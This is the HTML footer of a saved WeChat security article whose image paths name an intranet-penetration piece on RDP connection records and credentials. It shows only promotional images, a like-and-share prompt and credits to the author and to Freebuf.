/></p><p data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__835" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;color: rgb(163, 163, 163) !important;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247498688&amp;idx=1&amp;sn=d81921a3873e254b0a135d9ffaa00468&amp;chksm=ec1caeffdb6b27e9d129e1b00e92e01d49ccca43bb18f2388c733143557bfaaf62d0efd7f22f&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1"><span class="js_jump_icon h5_image_link" data-positionback="static" style="inset: auto;"><img class="rich_pages" data-galleryid="" data-ratio="0.4269788182831661" data-s="300,640" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/34_ZtzN9KGsEWibPgYw55Lkm5VuKthibQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="897" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 36px;box-sizing: border-box !important;visibility: visible !important;width: 677px !important;height: auto !important;"  /></span></a></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); color: rgb(163, 163, 163) !important;" class="js_darkmode__836" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)"  /></p><p data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__837" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(163, 163, 163)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)" style="white-space: normal;background-color: rgb(255, 255, 255);font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(255, 104, 39)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)|rgb(255, 104, 39)" style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)" data-darkmode-bgcolor-16267000829072="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16267000829072="#fff|rgb(255, 255, 255)" data-darkmode-color-16267000829072="rgb(255, 104, 39)" data-darkmode-original-color-16267000829072="#fff|rgb(163, 163, 163)|rgb(255, 104, 39)">点赞，转发，在看</strong></span></p><p style="white-space: normal;text-align: center;"><br  /></p><p style="white-space: normal;text-align: right;"><span style="font-size:13px;line-height:33px;;">原创投稿作者：WHOAMI</span></p><p style="white-space: normal;text-align: right;"><span style="font-size:13px;line-height:33px;;">文章首发：Freebuf</span></p><p style="white-space: normal;text-align: center;"><img class="rich_pages wxw-img" data-galleryid="" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/35_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style="height: auto !important;"  /></p>
                </div>
</div>
</body>
</html>